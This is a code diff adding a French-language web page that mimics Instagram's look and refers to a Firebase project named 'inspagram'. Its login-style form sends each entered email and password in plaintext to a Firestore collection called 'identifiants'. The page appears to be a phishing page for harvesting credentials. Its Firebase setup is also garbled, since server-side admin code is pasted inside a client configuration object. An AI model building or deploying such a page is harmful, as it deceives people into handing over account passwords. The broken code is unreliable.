@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enregistrement des Identifiants</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #007bdb;
+        }
+    </style>
+    <!-- Importer Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <h1>Enregistrement</h1>
+    <form id="loginForm" onsubmit="handleSubmit(event)">
+        <input type="text" id="email" name="email" placeholder="Email" required>
+        <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        <button type="submit">S'inscrire</button>
+    </form>
+</div>
+
+<script>
+    // Configuration de Firebase
+    const firebaseConfig = {
+        var admin = require("firebase-admin");
+
+var serviceAccount = require("path/to/serviceAccountKey.json");
+
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: "https://inspagram-6bdf7-default-rtdb.firebaseio.com"
+});
+
+    };
+
+    // Initialiser Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Référencer Firestore
+    const db = firebase.firestore();
+
+    // Gérer la soumission du formulaire
+    function handleSubmit(event) {
+        event.preventDefault(); // Empêche le rechargement de la page
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Ajouter les identifiants à Firestore
+        db.collection("identifiants").add({
+            email: email,
+            password: password
+        })
+        .then(() => {
+            alert('Identifiants enregistrés avec succès !');
+        })
+        .catch((error) => {
+            console.error('Erreur lors de l\'enregistrement : ', error);
+            alert('Erreur lors de l\'enregistrement des identifiants');
+        });
+    }
+</script>
+
+</body>
+</html>
